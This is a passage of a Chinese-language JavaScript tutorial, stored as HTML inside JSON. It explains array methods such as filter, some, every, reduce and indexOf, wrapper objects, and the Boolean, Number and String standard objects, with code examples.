&#039;a&#039;, false];\n\narr.filter(Boolean)\n// [1, &quot;a&quot;]</code></pre><p>上面代码中，<code>filter</code>方法返回数组<code>arr</code>里面所有布尔值为<code>true</code>的成员。</p>\n<p><code>filter</code>方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem, index, arr) {\n  return index % 2 === 0;\n});\n// [1, 3, 5]</code></pre><p>上面代码返回偶数位置的成员组成的新数组。</p>\n<p><code>filter</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { MAX: 3 };\nvar myFilter = function (item) {\n  if (item &gt; this.MAX) return true;\n};\n\nvar arr = [2, 8, 3, 4, 1, 3, 2, 9];\narr.filter(myFilter, obj) // [8, 4, 9]</code></pre><p>上面代码中，过滤器<code>myFilter</code>内部有<code>this</code>变量，它可以被<code>filter</code>方法的第二个参数<code>obj</code>绑定，返回大于<code>3</code>的成员。</p>\n\n        <h3>\n            <a href='#some()，every()' class='header-anchor'>#</a>\n            <span>some()，every()</span>\n        </h3>\n    <p>这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。</p>\n<p>它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。</p>\n<p><code>some</code>方法是只要一个成员的返回值是<code>true</code>，则整个<code>some</code>方法的返回值就是<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.some(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// true</code></pre><p>上面代码中，如果数组<code>arr</code>有一个成员大于等于3，<code>some</code>方法就返回<code>true</code>。</p>\n<p><code>every</code>方法是所有成员的返回值都是<code>true</code>，整个<code>every</code>方法才返回<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.every(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// false</code></pre><p>上面代码中，数组<code>arr</code>并非所有成员大于等于<code>3</code>，所以返回<code>false</code>。</p>\n<p>注意，对于空数组，<code>some</code>方法返回<code>false</code>，<code>every</code>方法返回<code>true</code>，回调函数都不会执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isEven(x) { return x % 2 === 0 }\n\n[].some(isEven) // false\n[].every(isEven) // true</code></pre><p><code>some</code>和<code>every</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n\n        <h3>\n            <a href='#reduce()，reduceRight()' class='header-anchor'>#</a>\n            <span>reduce()，reduceRight()</span>\n        </h3>\n    <p><code>reduce</code>方法和<code>reduceRight</code>方法依次处理数组的每个成员，最终累计为一个值。它们的差别是，<code>reduce</code>是从左到右处理（从第一个成员到最后一个成员），<code>reduceRight</code>则是从右到左（从最后一个成员到第一个成员），其他完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  console.log(a, b);\n  return a + b;\n})\n// 1 2\n// 3 3\n// 6 4\n// 10 5\n//最后结果：15</code></pre><p>上面代码中，<code>reduce</code>方法求出数组所有成员的和。第一次执行，<code>a</code>是数组的第一个成员<code>1</code>，<code>b</code>是数组的第二个成员<code>2</code>。第二次执行，<code>a</code>为上一轮的返回值<code>3</code>，<code>b</code>为第三个成员<code>3</code>。第三次执行，<code>a</code>为上一轮的返回值<code>6</code>，<code>b</code>为第四个成员<code>4</code>。第四次执行，<code>a</code>为上一轮返回值<code>10</code>，<code>b</code>为第五个成员<code>5</code>。至此所有成员遍历完成，整个方法的返回值就是最后一轮的返回值<code>15</code>。</p>\n<p><code>reduce</code>方法和<code>reduceRight</code>方法的第一个参数都是一个函数。该函数接受以下四个参数。</p>\n<ol>\n<li>累积变量，默认为数组的第一个成员</li>\n<li>当前变量，默认为数组的第二个成员</li>\n<li>当前位置（从0开始）</li>\n<li>原数组</li>\n</ol>\n<p>这四个参数之中，只有前两个是必须的，后两个则是可选的。</p>\n<p>如果要对累积变量指定初值，可以把它放在<code>reduce</code>方法和<code>reduceRight</code>方法的第二个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  return a + b;\n}, 10);\n// 25</code></pre><p>上面代码指定参数<code>a</code>的初值为10，所以数组从10开始累加，最终结果为25。注意，这时<code>b</code>是从数组的第一个成员开始遍历。</p>\n<p>上面的第二个参数相当于设定了默认值，处理空数组时尤其有用。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(prev, cur) {\n  return prev + cur;\n}\n\n[].reduce(add)\n// TypeError: Reduce of empty array with no initial value\n[].reduce(add, 1)\n// 1</code></pre><p>上面代码中，由于空数组取不到初始值，<code>reduce</code>方法会报错。这时，加上第二个参数，就能保证总是会返回一个值。</p>\n<p>下面是一个<code>reduceRight</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function substract(prev, cur) {\n  return prev - cur;\n}\n\n[3, 2, 1].reduce(substract) // 0\n[3, 2, 1].reduceRight(substract) // -4</code></pre><p>上面代码中，<code>reduce</code>方法相当于<code>3</code>减去<code>2</code>再减去<code>1</code>，<code>reduceRight</code>方法相当于<code>1</code>减去<code>2</code>再减去<code>3</code>。</p>\n<p>由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>function findLongest(entries) {\n  return entries.reduce(function (longest, entry) {\n    return entry.length &gt; longest.length ? entry : longest;\n  }, &#039;&#039;);\n}\n\nfindLongest([&#039;aaa&#039;, &#039;bb&#039;, &#039;c&#039;]) // &quot;aaa&quot;</code></pre><p>上面代码中，<code>reduce</code>的参数函数会将字符长度较长的那个数组成员，作为累积值。这导致遍历所有成员之后，累积值就是字符长度最长的那个成员。</p>\n\n        <h3>\n            <a href='#indexOf()，lastIndexOf()' class='header-anchor'>#</a>\n            <span>indexOf()，lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.indexOf(&#039;b&#039;) // 1\na.indexOf(&#039;y&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示搜索的开始位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].indexOf(&#039;a&#039;, 1) // -1</code></pre><p>上面代码从1号位置开始搜索字符<code>a</code>，结果为<code>-1</code>，表示没有搜索到。</p>\n<p><code>lastIndexOf</code>方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [2, 5, 9, 2];\na.lastIndexOf(2) // 3\na.lastIndexOf(7) // -1</code></pre><p>注意，这两个方法不能用来搜索<code>NaN</code>的位置，即它们无法确定数组成员是否包含<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1\n[NaN].lastIndexOf(NaN) // -1</code></pre><p>这是因为这两个方法内部，使用严格相等运算符（<code>===</code>）进行比较，而<code>NaN</code>是唯一一个不等于自身的值。</p>\n\n        <h3>\n            <a href='#链式使用' class='header-anchor'>#</a>\n            <span>链式使用</span>\n        </h3>\n    <p>上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var users = [\n  {name: &#039;tom&#039;, email: &#039;tom@example.com&#039;},\n  {name: &#039;peter&#039;, email: &#039;peter@example.com&#039;}\n];\n\nusers\n.map(function (user) {\n  return user.email;\n})\n.filter(function (email) {\n  return /^t/.test(email);\n})\n.forEach(console.log);\n// &quot;tom@example.com&quot;</code></pre><p>上面代码中，先产生一个所有 Email 地址组成的数组，然后再过滤出以<code>t</code>开头的 Email 地址。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Nicolas Bevacqua, <a href=\"http://flippinawesome.org/2013/11/25/fun-with-javascript-native-array-functions/\">Fun with JavaScript Native Array Functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"包装对象","link":"/stdlib/wrapper.html"}],"content":"\n        <h1>\n            <a href='#包装对象' class='header-anchor'>#</a>\n            <span>包装对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”。</p>\n<p>所谓“包装对象”，就是分别与数值、字符串、布尔值相对应的<code>Number</code>、<code>String</code>、<code>Boolean</code>三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = new Number(123);\nvar v2 = new String(&#039;abc&#039;);\nvar v3 = new Boolean(true);</code></pre><p>上面代码中，基于原始类型的值，生成了三个对应的包装对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof v1 // &quot;object&quot;\ntypeof v2 // &quot;object&quot;\ntypeof v3 // &quot;object&quot;\n\nv1 === 123 // false\nv2 === &#039;abc&#039; // false\nv3 === true // false</code></pre><p>包装对象的最大目的，首先是使得 JavaScript 的对象涵盖所有的值，其次使得原始类型的值可以方便地调用某些方法。</p>\n<p><code>Number</code>、<code>String</code>和<code>Boolean</code>如果不作为构造函数调用（即调用时不加<code>new</code>），常常用于将任意类型的值转为数值、字符串和布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(123) // 123\nString(&#039;abc&#039;) // &quot;abc&quot;\nBoolean(true) // true</code></pre><p>上面这种数据类型的转换，详见《数据类型转换》一节。</p>\n<p>总结一下，这三个对象作为构造函数使用（带有<code>new</code>）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有<code>new</code>），可以将任意类型的值，转为原始类型的值。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p>三种包装对象各自提供了许多实例方法，详见后文。这里介绍两种它们共同具有、从<code>Object</code>对象继承的方法：<code>valueOf</code>和<code>toString</code>。</p>\n\n        <h3>\n            <a href='#valueOf()' class='header-anchor'>#</a>\n            <span>valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回包装对象实例对应的原始类型的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).valueOf()  // 123\nnew String(&#039;abc&#039;).valueOf() // &quot;abc&quot;\nnew Boolean(true).valueOf() // true</code></pre>\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p><code>toString</code>方法返回对应的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).toString() // &quot;123&quot;\nnew String(&#039;abc&#039;).toString() // &quot;abc&quot;\nnew Boolean(true).toString() // &quot;true&quot;</code></pre>\n        <h2>\n            <a href='#原始类型与实例对象的自动转换' class='header-anchor'>#</a>\n            <span>原始类型与实例对象的自动转换</span>\n        </h2>\n    <p>原始类型的值，可以自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，在使用后立刻销毁实例。</p>\n<p>比如，字符串可以调用<code>length</code>属性，返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre><p>上面代码中，<code>abc</code>是一个字符串，本身不是对象，不能调用<code>length</code>属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用<code>length</code>属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &#039;abc&#039;;\nstr.length // 3\n\n// 等同于\nvar strObj = new String(str)\n// String {\n//   0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3, [[PrimitiveValue]]: &quot;abc&quot;\n// }\nstrObj.length // 3</code></pre><p>上面代码中，字符串<code>abc</code>的包装对象提供了多个属性。</p>\n<p>自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;Hello World&#039;;\ns.x = 123;\ns.x // undefined</code></pre><p>上面代码为字符串<code>s</code>添加了一个<code>x</code>属性，结果无效，总是返回<code>undefined</code>。</p>\n<p>另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象<code>String.prototype</code>上定义（参见《面向对象编程》章节）。</p>\n\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。</p>\n<p>比如，我们可以新增一个<code>double</code>方法，使得字符串和数字翻倍。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n&#039;abc&#039;.double()\n// abcabc\n\nNumber.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n(123).double()\n// 246</code></pre><p>上面代码在<code>123</code>外面必须要加上圆括号，否则后面的点运算符（<code>.</code>）会被解释成小数点。</p>\n<p>但是，这种自定义方法和属性的机制，只能定义在包装对象的原型上，如果直接对原始类型的变量添加属性，则无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;abc&#039;;\n\ns.p = 123;\ns.p // undefined</code></pre><p>上面代码直接对字符串<code>abc</code>添加属性，结果无效。主要原因是上面说的，这里的包装对象是自动生成的，赋值后自动销毁，所以最后一行实际上调用的是一个新的包装对象。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Boolean 对象","link":"/stdlib/boolean.html"}],"content":"\n        <h1>\n            <a href='#Boolean-对象' class='header-anchor'>#</a>\n            <span>Boolean 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Boolean</code>对象是 JavaScript 的三个包装对象之一。作为构造函数，它主要用于生成布尔值的包装对象实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var b = new Boolean(true);\n\ntypeof b // &quot;object&quot;\nb.valueOf() // true</code></pre><p>上面代码的变量<code>b</code>是一个<code>Boolean</code>对象的实例，它的类型是对象，值为布尔值<code>true</code>。</p>\n<p>注意，<code>false</code>对应的包装对象实例，布尔运算结果也是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (new Boolean(false).valueOf()) {\n  console.log(&#039;true&#039;);\n} // 无输出</code></pre><p>上面代码的第一个例子之所以得到<code>true</code>，是因为<code>false</code>对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值<code>true</code>（因为所有对象对应的布尔值都是<code>true</code>）。而实例的<code>valueOf</code>方法，则返回实例对应的原始值，本例为<code>false</code>。</p>\n\n        <h2>\n            <a href='#Boolean-函数的类型转换作用' class='header-anchor'>#</a>\n            <span>Boolean 函数的类型转换作用</span>\n        </h2>\n    <p><code>Boolean</code>对象除了可以作为构造函数，还可以单独使用，将任意值转为布尔值。这时<code>Boolean</code>就是一个单纯的工具方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(&#039;&#039;) // false\nBoolean(NaN) // false\n\nBoolean(1) // true\nBoolean(&#039;false&#039;) // true\nBoolean([]) // true\nBoolean({}) // true\nBoolean(function () {}) // true\nBoolean(/foo/) // true</code></pre><p>上面代码中几种得到<code>true</code>的情况，都值得认真记住。</p>\n<p>顺便提一下，使用双重的否运算符（<code>!</code>）也可以将任意值转为对应的布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!undefined // false\n!!null // false\n!!0 // false\n!!&#039;&#039; // false\n!!NaN // false\n!!1 // true\n!!&#039;false&#039; // true\n!![] // true\n!!{} // true\n!!function(){} // true\n!!/foo/ // true</code></pre><p>最后，对于一些特殊值，<code>Boolean</code>对象前面加不加<code>new</code>，会得到完全相反的结果，必须小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // true</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Number 对象","link":"/stdlib/number.html"}],"content":"\n        <h1>\n            <a href='#Number-对象' class='header-anchor'>#</a>\n            <span>Number 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Number</code>对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。</p>\n<p>作为构造函数时，它用于生成值为数值的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = new Number(1);\ntypeof n // &quot;object&quot;</code></pre><p>上面代码中，<code>Number</code>对象作为构造函数使用，返回一个值为<code>1</code>的对象。</p>\n<p>作为工具函数时，它可以将任何类型的值转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(true) // 1</code></pre><p>上面代码将布尔值<code>true</code>转为数值<code>1</code>。<code>Number</code>作为工具函数的用法，详见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Number</code>对象拥有以下一些静态属性（即直接定义在<code>Number</code>对象上的属性，而不是定义在实例上的属性）。</p>\n<ul>\n<li><code>Number.POSITIVE_INFINITY</code>：正的无限，指向<code>Infinity</code>。</li>\n<li><code>Number.NEGATIVE_INFINITY</code>：负的无限，指向<code>-Infinity</code>。</li>\n<li><code>Number.NaN</code>：表示非数值，指向<code>NaN</code>。</li>\n<li><code>Number.MIN_VALUE</code>：表示最小的正数（即最接近0的正数，在64位浮点数体系中为<code>5e-324</code>），相应的，最接近0的负数为<code>-Number.MIN_VALUE</code>。</li>\n<li><code>Number.MAX_SAFE_INTEGER</code>：表示能够精确表示的最大整数，即<code>9007199254740991</code>。</li>\n<li><code>Number.MIN_SAFE_INTEGER</code>：表示能够精确表示的最小整数，即<code>-9007199254740991</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Number.POSITIVE_INFINITY // Infinity\nNumber.NEGATIVE_INFINITY // -Infinity\nNumber.NaN // NaN\n\nNumber.MAX_VALUE\n// 1.7976931348623157e+308\nNumber.MAX_VALUE &lt; Infinity\n// true\n\nNumber.MIN_VALUE\n// 5e-324\nNumber.MIN_VALUE &gt; 0\n// true\n\nNumber.MAX_SAFE_INTEGER // 9007199254740991\nNumber.MIN_SAFE_INTEGER // -9007199254740991</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Number</code>对象有4个实例方法，都跟将数值转换成指定格式有关。</p>\n\n        <h3>\n            <a href='#Number.prototype.toString()' class='header-anchor'>#</a>\n            <span>Number.prototype.toString()</span>\n        </h3>\n    <p><code>Number</code>对象部署了自己的<code>toString</code>方法，用来将一个数值转为字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString() // &quot;10&quot;</code></pre><p><code>toString</code>方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString(2) // &quot;1010&quot;\n(10).toString(8) // &quot;12&quot;\n(10).toString(16) // &quot;a&quot;</code></pre><p>上面代码中，<code>10</code>一定要放在括号里，这样表明后面的点表示调用对象属性。如果不加括号，这个点会被 JavaScript 引擎解释成小数点，从而报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.toString(2)\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>只要能够让 JavaScript 引擎不混淆小数点和对象的点运算符，各种写法都能用。除了为<code>10</code>加上括号，还可以在<code>10</code>后面加两个点，JavaScript 会把第一个点理解成小数点（即<code>10.0</code>），把第二个点理解成调用对象属性，从而得到正确结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>10..toString(2)\n// &quot;1010&quot;\n\n// 其他方法还包括\n10 .toString(2) // &quot;1010&quot;\n10.0.toString(2) // &quot;1010&quot;</code></pre><p>这实际上意味着，可以直接对一个小数使用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.5.toString() // &quot;10.5&quot;\n10.5.toString(2) // &quot;1010.1&quot;\n10.5.toString(8) // &quot;12.4&quot;\n10.5.toString(16) // &quot;a.8&quot;</code></pre><p>通过方括号运算符也可以调用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10[&#039;toString&#039;](2) // &quot;1010&quot;</code></pre><p><code>toString</code>方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用<code>parseInt</code>方法。</p>\n\n        <h3>\n            <a href='#Number.prototype.toFixed()' class='header-anchor'>#</a>\n            <span>Number.prototype.toFixed()</span>\n        </h3>\n    <p><code>toFixed</code>方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toFixed(2) // &quot;10.00&quot;\n10.005.toFixed(2) // &quot;10.01&quot;</code></pre><p>上面代码中，<code>10</code>和<code>10.005</code>转成2位小数，其中<code>10</code>必须放在括号里，否则后面的点会被处理成小数点。</p>\n<p><code>toFixed</code>方法的参数为小数位数，有效范围为0到20，超出这个范围将抛出 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toExponential()' class='header-anchor'>#</a>\n            <span>Number.prototype.toExponential()</span>\n        </h3>\n    <p><code>toExponential</code>方法用于将一个数转为科学计数法形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toExponential()  // &quot;1e+1&quot;\n(10).toExponential(1) // &quot;1.0e+1&quot;\n(10).toExponential(2) // &quot;1.00e+1&quot;\n\n(1234).toExponential()  // &quot;1.234e+3&quot;\n(1234).toExponential(1) // &quot;1.2e+3&quot;\n(1234).toExponential(2) // &quot;1.23e+3&quot;</code></pre><p><code>toExponential</code>方法的参数是小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toPrecision()' class='header-anchor'>#</a>\n            <span>Number.prototype.toPrecision()</span>\n        </h3>\n    <p><code>toPrecision</code>方法用于将一个数转为指定位数的有效数字。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.34).toPrecision(1) // &quot;1e+1&quot;\n(12.34).toPrecision(2) // &quot;12&quot;\n(12.34).toPrecision(3) // &quot;12.3&quot;\n(12.34).toPrecision(4) // &quot;12.34&quot;\n(12.34).toPrecision(5) // &quot;12.340&quot;</code></pre><p><code>toPrecision</code>方法的参数为有效数字的位数，范围是1到21，超出这个范围会抛出 RangeError 错误。</p>\n<p><code>toPrecision</code>方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.35).toPrecision(3) // &quot;12.3&quot;\n(12.25).toPrecision(3) // &quot;12.3&quot;\n(12.15).toPrecision(3) // &quot;12.2&quot;\n(12.45).toPrecision(3) // &quot;12.4&quot;</code></pre>\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>与其他对象一样，<code>Number.prototype</code>对象上面可以自定义方法，被<code>Number</code>的实例继承。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.add = function (x) {\n  return this + x;\n};\n\n8[&#039;add&#039;](2) // 10</code></pre><p>上面代码为<code>Number</code>对象实例定义了一个<code>add</code>方法。在数值上调用某个方法，数值会自动转为<code>Number</code>的实例对象，所以就可以调用<code>add</code>方法了。由于<code>add</code>方法返回的还是数值，所以可以链式运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.subtract = function (x) {\n  return this - x;\n};\n\n(8).add(2).subtract(4)\n// 6</code></pre><p>上面代码在<code>Number</code>对象的实例上部署了<code>subtract</code>方法，它可以与<code>add</code>方法链式调用。</p>\n<p>我们还可以部署更复杂的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.iterate = function () {\n  var result = [];\n  for (var i = 0; i &lt;= this; i++) {\n    result.push(i);\n  }\n  return result;\n};\n\n(8).iterate()\n// [0, 1, 2, 3, 4, 5, 6, 7, 8]</code></pre><p>上面代码在<code>Number</code>对象的原型上部署了<code>iterate</code>方法，将一个数值自动遍历为一个数组。</p>\n<p>注意，数值的自定义方法，只能定义在它的原型对象<code>Number.prototype</code>上面，数值本身是无法自定义属性的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 1;\nn.x = 1;\nn.x // undefined</code></pre><p>上面代码中，<code>n</code>是一个原始类型的数值。直接在它上面新增一个属性<code>x</code>，不会报错，但毫无作用，总是返回<code>undefined</code>。这是因为一旦被调用属性，<code>n</code>就自动转为<code>Number</code>的实例对象，调用结束后，该对象自动销毁。所以，下一次调用<code>n</code>的属性时，实际取到的是另一个对象，属性<code>x</code>当然就读不出来。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"String 对象","link":"/stdlib/string.html"}],"content":"\n        <h1>\n            <a href='#String-对象' class='header-anchor'>#</a>\n            <span>String 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>String</code>对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = new String(&#039;abc&#039;);\n\ntypeof s1 // &quot;string&quot;\ntypeof s2 // &quot;object&quot;\n\ns2.valueOf() // &quot;abc&quot;</code></pre><p>上面代码中，变量<code>s1</code>是字符串，<code>s2</code>是对象。由于<code>s2</code>是字符串对象，<code>s2.valueOf</code>方法返回的就是它所对应的原始字符串。</p>\n<p>字符串对象是一个类似数组的对象（很像数组，但不是数组）。</p>\n<pre class=\"prettyprint language-javascript\"><code>new String(&#039;abc&#039;)\n// String {0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3}\n\n(new String(&#039;abc&#039;))[1] // &quot;b&quot;</code></pre><p>上面代码中，字符串<code>abc</code>对应的字符串对象，有数值键（<code>0</code>、<code>1</code>、<code>2</code>）和<code>length</code>属性，所以可以像数组那样取值。</p>\n<p>除了用作构造函数，<code>String</code>对象还可以当作工具方法使用，将任意类型的值转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String(true) // &quot;true&quot;\nString(5) // &quot;5&quot;</code></pre><p>上面代码将布尔值<code>ture</code>和数值<code>5</code>，分别转换为字符串。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.fromCharCode()' class='header-anchor'>#</a>\n            <span>String.fromCharCode()</span>\n        </h3>\n    <p><code>String</code>对象提供的静态方法（即定义在对象本身，而不是定义在对象实例的方法），主要是<code>String.fromCharCode()</code>。该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode() // &quot;&quot;\nString.fromCharCode(97) // &quot;a&quot;\nString.fromCharCode(104, 101, 108, 108, 111)\n// &quot;hello&quot;</code></pre><p>上面代码中，<code>String.fromCharCode</code>方法的参数为空，就返回空字符串；否则，返回参数对应的 Unicode 字符串。</p>\n<p>注意，该方法不支持 Unicode 码点大于<code>0xFFFF</code>的字符，即传入的参数不能大于<code>0xFFFF</code>（即十进制的 65535）。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0x20BB7)\n// &quot;ஷ&quot;\nString.fromCharCode(0x20BB7) === String.fromCharCode(0x0BB7)\n// true</code></pre><p>上面代码中，<code>String.fromCharCode</code>参数<code>0x20BB7</code>大于<code>0xFFFF</code>，导致返回结果出错。<code>0x20BB7</code>对应的字符是汉字<code>𠮷</code>，但是返回结果却是另一个字符（码点<code>0x0BB7</code>）。这是因为<code>String.fromCharCode</code>发现参数值大于<code>0xFFFF</code>，就会忽略多出的位（即忽略<code>0x20BB7</code>里面的<code>2</code>）。</p>\n<p>这种现象的根本原因在于，码点大于<code>0xFFFF</code>的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须把<code>0x20BB7</code>拆成两个字符表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0xD842, 0xDFB7)\n// 